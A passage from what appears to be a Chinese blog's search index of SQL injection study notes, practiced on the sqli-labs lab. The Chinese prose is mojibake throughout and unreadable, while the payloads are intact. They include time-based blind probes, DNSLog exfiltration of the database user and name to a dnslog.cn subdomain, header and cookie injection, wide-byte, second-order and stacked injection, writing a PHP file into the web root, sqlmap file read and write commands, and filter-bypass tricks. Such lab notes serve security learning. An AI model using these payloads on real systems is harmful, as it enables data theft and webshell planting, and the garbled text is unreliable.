(if(ascii(substr(database(),1,1))&#x3D;115,sleep(5),1))--+&amp;passwd&#x3D;</span><br></pre></td></tr></table></figure><p>åœ¨å­˜åœ¨æ³¨å…¥ç‚¹POSTæäº¤çš„å‚æ•°åæ·»åŠ åˆ¤æ–­è¯­å¥ï¼Œæ ¹æ®å“åº”æ—¶é—´è·å–ä¿¡æ¯</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201203170636591.png" alt="image-20201203170636591"></p><p>ç»§ç»­åˆ¤æ–­</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201203170851871.png" alt="image-20201203170851871"></p><p>æœ€ååˆ¤æ–­å…¶é•¿åº¦ä¸º8ï¼Œä»¥æ­¤ç±»æ¨ï¼Œåˆ¤æ–­å…¶ä»–ä¿¡æ¯â€¦â€¦</p><p><strong>åˆ©ç”¨Sqlmapæµ‹è¯•</strong></p><p>åŒæ ·ï¼Œè¿™é‡Œå¤åˆ¶æ•°æ®åŒ…è‡³target.txt,æ¢æµ‹æŠ€æœ¯ä¸ºâ€“technique B/T</p><h1 id="DNSLogæ³¨å…¥"><a href="#DNSLogæ³¨å…¥" class="headerlink" title="DNSLogæ³¨å…¥"></a>DNSLogæ³¨å…¥</h1><p>åˆ©ç”¨åœºæ™¯ï¼š</p><p>ä¸ç®¡æ˜¯å¸ƒå°”ç±»å‹ç›²æ³¨è¿˜æ˜¯æ—¶é—´ç›²æ³¨ï¼Œéƒ½éœ€è¦å‘é€å¤§é‡çš„æ•°æ®åŒ…å»åˆ¤æ–­æ•°æ®ï¼Œè€Œè¿™å¾ˆå¯èƒ½ä¼šè§¦å‘WAFçš„é˜²æŠ¤ï¼Œå› æ­¤å¯¼è‡´è¢«å°IPã€‚æ‰€ä»¥ï¼Œå¦‚æœæ¡ä»¶å…è®¸ï¼Œæˆ‘ä»¬å¯ä»¥ç»“åˆDNSlogæ¥å¿«é€Ÿçš„å›æ˜¾æ•°æ®ã€‚MySQLæ•°æ®åº“ï¼Œé€šè¿‡DNSlogç›²æ³¨éœ€è¦ç”¨åˆ° load_file() å‡½æ•°ï¼Œè¯¥å‡½æ•°ä¸ä»…èƒ½åŠ è½½æœ¬åœ°æ–‡ä»¶ï¼ŒåŒæ—¶ä¹Ÿèƒ½å¯¹URLå‘èµ·è¯·æ±‚ã€‚å› ä¸ºéœ€è¦ä½¿ç”¨ load_file() å‡½æ•°ï¼Œæ‰€ä»¥éœ€è¦rootæƒé™ï¼Œå¹¶ä¸” secure_file_priv éœ€è¦ä¸ºç©ºã€‚</p><p>åŸç†ï¼š</p><p>æˆ‘ä»¬è¾“å…¥åŸŸåä¹‹å ï¼Œéœ€è¦å‘DNSæœåŠ¡å™¨æŸ¥è¯¢å¯¹åº”çš„IPåœ°å€ï¼ŒDNSæœåŠ¡å™¨åœ¨è§£æçš„æ—¶å€™ä¼šç•™ä¸‹è®°å½•ï¼Œäº§ç”Ÿæ—¥å¿—ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æŸ¥çœ‹æ—¥å¿—æ¥è·å–ç›¸åº”ä¿¡æ¯</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201213182240957.png" alt="image-20201213182240957"></p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># æŸ¥è¯¢å½“å‰ç”¨æˆ·å</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and (select load_file(concat(&#39;\\\\&#39;,(select hex(user())),&#39;.5srmkc.dnslog.cn&#x2F;abc&#39;))) --+</span><br><span class="line"></span><br><span class="line"># æŸ¥çœ‹å½“å‰æ•°æ®åº“å</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and (select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.5srmkc.dnslog.cn&#x2F;abc&#39;))) --+</span><br></pre></td></tr></table></figure><p>ç›¸å…³ç½‘ç«™ï¼š<a href="http://www.dnslog.cn/">www.dnslog.cn</a></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201213183240282.png" alt="image-20201213183240282"></p><p>ç›¸å…³ç½‘ç«™ï¼š<a href="https://www.bejson.com/convert/ox2str/">https://www.bejson.com/convert/ox2str/</a></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201213192730846.png" alt="image-20201213192730846"></p><h1 id="HTTPå¤´ä¸­çš„SQLæ³¨å…¥"><a href="#HTTPå¤´ä¸­çš„SQLæ³¨å…¥" class="headerlink" title="HTTPå¤´ä¸­çš„SQLæ³¨å…¥"></a>HTTPå¤´ä¸­çš„SQLæ³¨å…¥</h1><p>ç”¨æˆ·æäº¤çš„å‚æ•°ä¼šè¢«ä»£ç ä¸­çš„æŸäº›æªæ–½è¿›è¡Œè¿‡æ»¤ï¼Œä½†å¯¹äºHTTPå¤´ä¸­æäº¤çš„å†…å®¹å¾ˆæœ‰å¯èƒ½å°±æ²¡æœ‰è¿›è¡Œè¿‡æ»¤ï¼Œå¦‚HTTPå¤´ä¸­User-Agentã€Refererã€Cookiesç­‰ã€‚</p><p><strong>1.HTTP User-Agent æ³¨å…¥</strong></p><p>åˆ¤æ–­æ³¨å…¥ç‚¹</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201206223156670.png" alt="image-20201206223156670"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; and extractvalue(1,concat(0x7e,(payload),0x7e)) or &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201206222552051.png" alt="image-20201206222552051"></p><p><strong>2.HTTP Referer æ³¨å…¥</strong></p><p>æ³¨å…¥ç‚¹åœ¨Refererä½ç½®</p><p><strong>3.Cookieæ³¨å…¥</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname&#x3D;admin&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)#</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201207155137874.png" alt="image-20201207155137874"></p><p><strong>Sqlmapæµ‹è¯•</strong></p><p>åœ¨æ³¨å…¥ç‚¹ä½ç½®å¤„æ·»åŠ *</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201207160206033.png" alt="image-20201207160206033"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r target.txt --level 3 --batch</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Parameter: Cookie #1* ((custom) HEADER)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: uname&#x3D;admin&#39; AND 6901&#x3D;6901-- FpnT</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)</span><br><span class="line">    Payload: uname&#x3D;admin&#39; AND GTID_SUBSET(CONCAT(0x71627a7071,(SELECT (ELT(9508&#x3D;9508,1))),0x71766a7871),9508)-- kWcz</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: uname&#x3D;admin&#39; AND (SELECT 6663 FROM (SELECT(SLEEP(5)))sHMZ)-- iCIs</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 4 columns</span><br><span class="line">    Payload: uname&#x3D;-8722&#39; UNION ALL SELECT NULL,NULL,CONCAT(0x71627a7071,0x4f414141466c504c686648564856454869665a68614a4b564d6c4775556f6d6d79464e446f6f7078,0x71766a7871)-- -</span><br></pre></td></tr></table></figure><h1 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h1><p>åŸç†ï¼š</p><p>å¤§å®¶éƒ½çŸ¥é“%dfâ€™ è¢«PHPè½¬ä¹‰ï¼ˆå¼€å¯GPCã€ç”¨addslasheså‡½æ•°ï¼Œæˆ–è€…icovç­‰ï¼‰ï¼Œå•å¼•å·è¢«åŠ ä¸Šåæ–œæ \ï¼Œå˜æˆäº† %df\â€™ï¼Œå…¶ä¸­\çš„åå…­è¿›åˆ¶æ˜¯ %5C ï¼Œé‚£ä¹ˆç°åœ¨ <code>%df\â€™</code> =<code>%df%5c%27</code>ï¼Œå¦‚æœç¨‹åºçš„é»˜è®¤å­—ç¬¦é›†æ˜¯GBKç­‰å®½å­—èŠ‚å­—ç¬¦é›†ï¼Œåˆ™MySQLç”¨GBKçš„ç¼–ç æ—¶ï¼Œä¼šè®¤ä¸º <code>%df%5c</code> æ˜¯ä¸€ä¸ªå®½å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯<code>ç¸—</code>ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼š%df\â€™ = %df%5c%27=ç¸—â€™ï¼Œæœ‰äº†å•å¼•å·å°±å¥½æ³¨å…¥äº†ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201213151446003.png" alt="image-20201213151446003"></p><p>ç¤ºä¾‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlilabs&#x2F;Less-33&#x2F;index.php?id&#x3D;%df&#39; union select 1,group_concat(username,0x7e,password),3 from users--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201210204415465.png" alt="image-20201210204415465"></p><h1 id="äºŒæ¬¡æ³¨å…¥"><a href="#äºŒæ¬¡æ³¨å…¥" class="headerlink" title="äºŒæ¬¡æ³¨å…¥"></a>äºŒæ¬¡æ³¨å…¥</h1><p>åŸç†ï¼š</p><p>äºŒæ¬¡æ³¨å…¥å¯ä»¥ç†è§£ä¸ºï¼Œæ”»å‡»è€…æ„é€ çš„æ¶æ„æ•°æ®å­˜å‚¨åœ¨æ•°æ®åº“åï¼Œæ¶æ„æ•°æ®è¢«è¯»å–å¹¶è¿›å…¥åˆ°SQLæŸ¥è¯¢è¯­å¥æ‰€å¯¼è‡´çš„æ³¨å…¥ã€‚é˜²å¾¡è€…å¯èƒ½åœ¨ç”¨æˆ·è¾“å…¥æ¶æ„æ•°æ®æ—¶å¯¹å…¶ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†è½¬ä¹‰å¤„ç†ï¼Œä½†åœ¨æ¶æ„æ•°æ®æ’å…¥åˆ°æ•°æ®åº“æ—¶è¢«å¤„ç†çš„æ•°æ®åˆè¢«è¿˜åŸå¹¶å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œå½“Webç¨‹åºè°ƒç”¨å­˜å‚¨åœ¨æ•°æ®åº“ä¸­çš„æ¶æ„æ•°æ®å¹¶æ‰§è¡ŒSQLæŸ¥è¯¢æ—¶ï¼Œå°±å‘ç”Ÿäº†SQLäºŒæ¬¡æ³¨å…¥ã€‚</p><p>ç¤ºä¾‹ï¼š</p><p>åœ¨sqlilabsï¼ŒLess-24ä¸­æ³¨å†Œç”¨æˆ·åä¸ºadminâ€™#å¯†ç ä¸º123çš„è´¦å·</p><p>ç™»å½•ç”¨æˆ·å admiâ€™# å¹¶ä¿®æ”¹å¯†ç ä¸º123456ï¼Œç»“æœæ˜¯ç”¨æˆ·åä¸ºadminçš„å¯†ç è¢«ä¿®æ”¹äº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql &#x3D; &quot;UPDATE users SET PASSWORD&#x3D;&#39;$pass&#39; where username&#x3D;&#39;$username&#39; and password&#x3D;&#39;$curr_pass&#39; &quot;;</span><br><span class="line">è¿™æ˜¯ä¸Šé¢çš„æ•°æ®åº“æ›´æ–°è¯­å¥ï¼Œåœ¨ç”¨æˆ·åä¸º &quot;admin&#39;#&quot; æ—¶æ‰§è¡Œçš„å®é™…æ˜¯ï¼š</span><br><span class="line">$sql &#x3D; &quot;UPDATE users SET PASSWORD&#x3D;&#39;$pass&#39; where username&#x3D;&#39;admin&#39;#&#39; and password&#x3D;&#39;$curr_pass&#39; &quot;;</span><br></pre></td></tr></table></figure><h1 id="å †å æ³¨å…¥"><a href="#å †å æ³¨å…¥" class="headerlink" title="å †å æ³¨å…¥"></a>å †å æ³¨å…¥</h1><p>åŸç†ï¼š</p><p>åœ¨SQLä¸­ï¼Œåˆ†å·ï¼ˆ;ï¼‰æ˜¯ç”¨æ¥è¡¨ç¤ºä¸€æ¡sqlè¯­å¥çš„ç»“æŸã€‚è¯•æƒ³ä¸€ä¸‹æˆ‘ä»¬åœ¨ ; ç»“æŸä¸€ä¸ªsqlè¯­å¥åç»§ç»­æ„é€ ä¸‹ä¸€æ¡è¯­å¥ï¼Œä¼šä¸ä¼šä¸€èµ·æ‰§è¡Œï¼Ÿå› æ­¤è¿™ä¸ªæƒ³æ³•ä¹Ÿå°±é€ å°±äº†å †å æ³¨å…¥ã€‚è€Œunion injectionï¼ˆè”åˆæ³¨å…¥ï¼‰ä¹Ÿæ˜¯å°†ä¸¤æ¡è¯­å¥åˆå¹¶åœ¨ä¸€èµ·ï¼Œä¸¤è€…ä¹‹é—´æœ‰ä»€ä¹ˆåŒºåˆ«ä¹ˆï¼ŸåŒºåˆ«å°±åœ¨äºunion æˆ–è€…union allæ‰§è¡Œçš„è¯­å¥ç±»å‹æ˜¯æœ‰é™çš„ï¼Œå¯ä»¥ç”¨æ¥æ‰§è¡ŒæŸ¥è¯¢è¯­å¥ï¼Œè€Œå †å æ³¨å…¥å¯ä»¥æ‰§è¡Œçš„æ˜¯ä»»æ„çš„è¯­å¥ã€‚ä¾‹å¦‚ä»¥ä¸‹è¿™ä¸ªä¾‹å­ã€‚ç”¨æˆ·è¾“å…¥ï¼š1; DELETE FROM productsæœåŠ¡å™¨ç«¯ç”Ÿæˆçš„sqlè¯­å¥ä¸ºï¼šï¼ˆå› æœªå¯¹è¾“å…¥çš„å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼‰Select * from products where productid=1;DELETE FROM productså½“æ‰§è¡ŒæŸ¥è¯¢åï¼Œç¬¬ä¸€æ¡æ˜¾ç¤ºæŸ¥è¯¢ä¿¡æ¯ï¼Œç¬¬äºŒæ¡åˆ™å°†æ•´ä¸ªè¡¨è¿›è¡Œåˆ é™¤</p><p>å±€é™æ€§ï¼š</p><p>å †å æ³¨å…¥çš„å±€é™æ€§åœ¨äºå¹¶ä¸æ˜¯æ¯ä¸€ä¸ªç¯å¢ƒä¸‹éƒ½å¯ä»¥æ‰§è¡Œï¼Œ å¯èƒ½å—åˆ° API æˆ–è€…æ•°æ®åº“å¼•æ“ä¸æ”¯æŒçš„é™åˆ¶ï¼Œåœ¨æˆ‘ä»¬çš„ web ç³»ç»Ÿä¸­ï¼Œ å› ä¸ºä»£ç é€šå¸¸åªè¿”å›ä¸€ä¸ªæŸ¥è¯¢ç»“æœï¼Œ å› æ­¤ï¼Œ å †å æ³¨å…¥ç¬¬äºŒä¸ªè¯­å¥äº§ç”Ÿé”™è¯¯æˆ–è€…ç»“æœåªèƒ½è¢«å¿½ç•¥ï¼Œ æˆ‘ä»¬åœ¨å‰ç«¯ç•Œé¢æ˜¯æ— æ³•çœ‹åˆ°è¿”å›ç»“æœçš„ã€‚å› æ­¤ï¼Œ åœ¨è¯»å–æ•°æ®æ—¶ï¼Œå»ºè®®ä½¿ç”¨unionï¼ˆè”åˆï¼‰ æ³¨å…¥ã€‚ åŒæ—¶åœ¨ä½¿ç”¨å †å æ³¨å…¥ä¹‹å‰ï¼Œæˆ‘ä»¬ä¹Ÿæ˜¯éœ€è¦çŸ¥é“ä¸€äº›æ•°æ®åº“ç›¸å…³ä¿¡æ¯çš„ï¼Œ ä¾‹å¦‚è¡¨<br>åï¼Œ åˆ—åç­‰ä¿¡æ¯</p><p>PSï¼šoracle ä¸èƒ½ä½¿ç”¨å †å æ³¨å…¥ï¼Œ å½“æœ‰ä¸¤æ¡è¯­å¥åœ¨åŒä¸€è¡Œæ—¶ï¼Œ ç›´æ¥æŠ¥é”™ã€‚ æ— æ•ˆå­—ç¬¦</p><p>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-38&#x2F;index.php ?id&#x3D;1%27;insert into users(id,username,password) values (&#39;39&#39;,&#39;less39&#39;,&#39;hello&#39;)--+</span><br></pre></td></tr></table></figure><h1 id="Mysqlæ³¨å…¥è¯»å†™æ–‡ä»¶"><a href="#Mysqlæ³¨å…¥è¯»å†™æ–‡ä»¶" class="headerlink" title="Mysqlæ³¨å…¥è¯»å†™æ–‡ä»¶"></a>Mysqlæ³¨å…¥è¯»å†™æ–‡ä»¶</h1><p>1.è¯»æ–‡ä»¶ï¼ˆ<a href="http://www.cnblogs.com/lcamry/p/5729087.html">MySQLæ³¨å…¥load_fileå¸¸ç”¨è·¯å¾„</a>ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlilabs&#x2F;Less-1&#x2F;index.php&#x2F;?id&#x3D;-1&#39; union select 1,2,load_file(&#39;D:\\1.txt&#39;)--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201130215923264.png" alt="image-20201130215923264"></p><p>2.å†™æ–‡ä»¶ï¼ˆå†™webshellåˆ°ç½‘ç«™ç›®å½•ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlilabs&#x2F;Less-7&#x2F;index.php&#x2F;?id&#x3D;-1&#39;)) union select 1,&#39;&lt;?php phpinfo(); ?&gt;&#39;,3 into outfile &#39;E:\\web\\apache\\htdocs\\1.php&#39;--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201130222727784.png" alt="image-20201130222727784"></p><p><strong>åˆ©ç”¨Sqlmapè¯»å†™æ–‡ä»¶</strong></p><p>â€“file-read â€œè·¯å¾„â€</p><p>â€“file-write â€œè¦å†™å…¥çš„å†…å®¹æˆ–æ‰€åœ¨æ–‡ä»¶è·¯å¾„â€ â€“file-dest â€œè¦å†™å…¥çš„è·¯å¾„â€</p><p>1.è¯»æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlilabs&#x2F;Less-7&#x2F;index.php&#x2F;?id&#x3D;1&quot; --file-read &quot;D:\\1.txt&quot;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201130224238087.png" alt="image-20201130224238087"></p><p>2.å†™æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlilabs&#x2F;Less-7&#x2F;index.php&#x2F;?id&#x3D;1&quot; --file-write &quot;E:\\1.txt&quot; --file-dest &quot;E:\\2.txt&quot;</span><br></pre></td></tr></table></figure><h1 id="SQLæ³¨å…¥ç»•è¿‡æ‰‹æ®µ"><a href="#SQLæ³¨å…¥ç»•è¿‡æ‰‹æ®µ" class="headerlink" title="SQLæ³¨å…¥ç»•è¿‡æ‰‹æ®µ"></a>SQLæ³¨å…¥ç»•è¿‡æ‰‹æ®µ</h1><p><strong>1.å¤§å°å†™ç»•è¿‡</strong></p><p>ä¾‹å¦‚ï¼šå¦‚æœè¿‡æ»¤äº†orderï¼Œå¯ä»¥ä½¿ç”¨OrdERæ¥è¿›è¡Œç»•è¿‡</p><p><strong>2.åŒå†™ç»•è¿‡</strong></p><p>ä¾‹å¦‚ï¼šå¦‚æœè¿‡æ»¤äº†unionï¼Œå‘ç°unionæ— è®ºå¤§å°å†™éƒ½ä¼šè¢«æ›¿æ¢ä¸ºç©ºï¼Œå¯ä»¥ä½¿ç”¨UniunionOn</p><p><strong>3.ç¼–ç ç»•è¿‡</strong></p><p>å¯ä»¥åˆ©ç”¨URLç¼–ç ï¼Œç»•è¿‡è¿‡æ»¤æœºåˆ¶</p><p>å¦‚ï¼Œunion%250cselect </p><p><strong>4.å†…è”æ³¨é‡Šç»•è¿‡</strong></p><p>å†…è”æ³¨é‡Šé‡Œçš„å†…å®¹ä¼šè¢«å½“æˆSQLè¯­å¥æ‰§è¡Œï¼Œä¾‹å¦‚/*!select */</p><p><strong>5.ç»•è¿‡å»é™¤æ³¨é‡Šç¬¦çš„SQLæ³¨å…¥</strong></p><p>â€“+ï¼Œâ€“ ï¼Œ# ï¼Œç­‰æ³¨é‡Šç¬¦è¢«è¿‡æ»¤å¤±æ•ˆï¼Œè€ƒè™‘å…¶ä»–æ–¹å¼ï¼Œå¦‚ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.77.1&#x2F;sqlilabs&#x2F;Less-23&#x2F;index.php&#x2F;?id&#x3D;-1&#39; union select 1,2,&#39;3</span><br><span class="line">http:&#x2F;&#x2F;192.168.77.1&#x2F;sqlilabs&#x2F;Less-23&#x2F;index.php&#x2F;?id&#x3D;1&#39; or (extractvalue(1,concat(0x7e,(payload)))) or &#39;</span><br></pre></td></tr></table></figure><p><strong>6.ç»•è¿‡è¿‡æ»¤andå’Œorçš„SQLæ³¨å…¥</strong></p><p>å¤§å°å†™å˜å½¢ï¼ŒOrï¼ŒoRï¼ŒAndï¼ŒaNDç­‰</p><p>æ·»åŠ æ³¨é‡Šï¼Œa/**/nd</p><p>åŒå†™ç»•è¿‡ï¼Œoorr</p><p>åˆ©ç”¨ç¬¦å·æ›¿ä»£ï¼Œandâ€“&amp;&amp;,orâ€“||</p><p><strong>7.ç»•è¿‡ç©ºæ ¼è¿‡æ»¤</strong></p><p>å¯ä½¿ç”¨ä»¥ä¸‹ä»£æ›¿ç©ºæ ¼</p><p>%09  TAB é”®ï¼ˆæ°´å¹³ï¼‰</p><p>%0b  TAB é”®ï¼ˆå‚ç›´ï¼‰</p><p>%0a  æ–°å»ºä¸€è¡Œ</p><p>%0c  æ–°çš„ä¸€é¡µ</p><p>%0d  return åŠŸèƒ½</p><p>%a0  ç©ºæ ¼</p><p>/* xxx*/  ä»£æ›¿ç©ºæ ¼(åˆ©ç”¨fuzzå¾—å‡ºxxx)</p><p>æˆ–è¯­å¥é—´ç”¨æ‹¬å·ï¼Œå¦‚ select(1)from(admin)where(length(passwd))=32</p><h1 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h1><p>[1] <a href="https://blog.csdn.net/DarkHQ/article/details/79274376">mysqlç›²æ³¨ï¼ˆåŸºäºæ—¶é—´ï¼‰</a></p><p>[2] <a href="https://www.cnblogs.com/csyxf/p/10241456.html">MysqlæŠ¥é”™å‹æ³¨å…¥æ€»ç»“</a></p><p>[3] <a href="https://blog.csdn.net/weixin_45146120/article/details/100186266?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromBaidu-1.control&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromBaidu-1.control">MYSQL POSTå‹æ³¨å…¥è¯¦è§£</a></p><p>[4] <a href="https://www.jianshu.com/p/3fe7904683ac">SQLæ³¨å…¥é˜²å¾¡ç»•è¿‡â€”â€”äºŒæ¬¡æ³¨å…¥</a></p><p>[5] <a href="https://blog.csdn.net/helloc0de/article/details/76180190">SQLæ³¨å…¥æ•™ç¨‹â€”â€”ï¼ˆå››ï¼‰å®½å­—èŠ‚æ³¨å…¥</a></p><p>[6] <a href="https://blog.csdn.net/qq_26406447/article/details/90643951">SQL Injection8(å †å æ³¨å…¥)â€”â€”å¼ºç½‘æ¯2019éšä¾¿æ³¨</a></p><p>[7] <a href="https://blog.csdn.net/weixin_44032232/article/details/109262724">ã€æ¸—é€æµ‹è¯•ã€‘DNSLogæ³¨å…¥</a></p>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Webå®‰å…¨å­¦ä¹  </tag>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQLé»˜è®¤åº“åŠè¯»å†™æ–‡ä»¶</title>
      <link href="posts/36028.html"/>
      <url>posts/36028.html</url>
      
        <content type="html"><![CDATA[<h1 id="MySQLé»˜è®¤åº“"><a href="#MySQLé»˜è®¤åº“" class="headerlink" title="MySQLé»˜è®¤åº“"></a>MySQLé»˜è®¤åº“</h1><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/ReAX6wu7mGhDbzE.png" alt="image-20201101161119257"></p><h2 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h2><p>åœ¨MySQLä¸­ï¼ŒæŠŠ information_schema çœ‹ä½œæ˜¯ä¸€ä¸ªæ•°æ®åº“ï¼Œç¡®åˆ‡è¯´æ˜¯ä¿¡æ¯æ•°æ®åº“ã€‚å…¶ä¸­ä¿å­˜ç€å…³äºMySQLæœåŠ¡å™¨æ‰€ç»´æŠ¤çš„æ‰€æœ‰å…¶ä»–æ•°æ®åº“çš„ä¿¡æ¯ã€‚å¦‚æ•°æ®åº“åï¼Œæ•°æ®åº“çš„è¡¨ï¼Œå­—æ®µç±»å‹ä¸è®¿é—®æƒ é™ç­‰ã€‚</p><p>æŸ¥è¯¢æ•°æ®åº“ã€è¡¨åã€å­—æ®µç­‰ä¿¡æ¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># çˆ†æ‰€æœ‰ç”¨æˆ·</span><br><span class="line">select group_concat(user) from mysql.user;</span><br><span class="line"> </span><br><span class="line"># çˆ†æ‰€æœ‰æ•°æ®åº“</span><br><span class="line">select group_concat(SCHEMA_NAME) from information_schema.schemata;</span><br><span class="line"> </span><br><span class="line"># çˆ†å½“å‰æ•°æ®åº“çš„è¡¨å</span><br><span class="line">select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database();</span><br><span class="line"> </span><br><span class="line"># è¡¨ä¸­æœ‰ä¸»ç çº¦æŸï¼Œéç©ºçº¦æŸç­‰å®Œæ•´æ€§çº¦æŸæ¡ä»¶çš„æƒ…å†µä¸‹ çˆ†è¡¨å</span><br><span class="line">select group_concat(table_name) from information_schema.table_constraints where table_schema&#x3D;database();</span><br><span class="line"> </span><br><span class="line"># çˆ†å­—æ®µå(è¡¨åæ˜¯ usersï¼ŒåŠ å¼•å·æˆ–åå…­è¿›åˆ¶ç¼–ç )</span><br><span class="line">select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;;</span><br><span class="line">select group_concat(column_name) from information_schema.columns where table_name&#x3D;0x7573657273;</span><br><span class="line"> </span><br><span class="line"># çˆ†å­—æ®µå†…å®¹</span><br><span class="line">select first_name,password from usersï¼›</span><br></pre></td></tr></table></figure><h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><p>è¿™ä¸ªæ˜¯mysqlçš„æ ¸å¿ƒæ•°æ®åº“ï¼Œç±»ä¼¼äºsql 